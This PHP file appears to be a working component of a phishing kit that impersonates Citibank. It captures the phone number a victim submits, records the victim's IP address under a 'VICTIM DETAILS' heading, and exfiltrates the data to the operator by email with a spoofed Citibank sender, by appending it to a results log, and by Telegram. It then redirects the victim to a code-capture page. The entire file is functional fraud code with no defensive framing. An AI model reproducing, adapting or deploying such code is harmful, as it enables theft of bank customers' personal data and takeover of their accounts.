<?php
$rootDir = dirname(__DIR__, 3);
$settings = require_once $rootDir . '/settings/settings.php';
require_once __DIR__ . '/telegram.php';

if (!is_array($settings)) {
    $settings = array();
}

if (!empty($settings['debug']) && $settings['debug'] == '1') {
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
} else {
    error_reporting(0);
}

function get_client_ip() {
    $ipaddress = 'UNKNOWN';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    }
    return $ipaddress;
}

$IP = get_client_ip();
$filename = $rootDir . '/Logs/results.txt';
$client = @file_get_contents($rootDir . '/Logs/client.txt');
if ($client === false) {
    $client = '0';
}

$phone = trim($_POST['phone'] ?? '');

setcookie('citi_phone', $phone, time() + 3600, '/');

$message = "[🍁 | CITI PHONE | CLIENT :{$client} 🍁]\n\n";
$message .= "********** [ 📱 PHONE VERIFICATION 📱 ] **********\n";
$message .= "# PHONE NUMBER : {$phone}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

if (!empty($settings['send_mail']) && $settings['send_mail'] == '1') {
    $to = $settings['email'] ?? 'unknown@example.com';
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: MrWeeBee <citibank@client_{$client}_site.com>\r\n";
    $subject = "🍁 CITI 🍁 PHONE 🍁 CLIENT #{$client} 🍁 {$IP}";
    @mail($to, $subject, $message, $headers);
}

if (!empty($settings['save_results']) && $settings['save_results'] == '1') {
    file_put_contents($filename, $message, FILE_APPEND);
}

if (!empty($settings['telegram']) && $settings['telegram'] == '1') {
    send_telegram_message($settings, $message);
}

header('Location: ../code.php', true, 302);
exit;
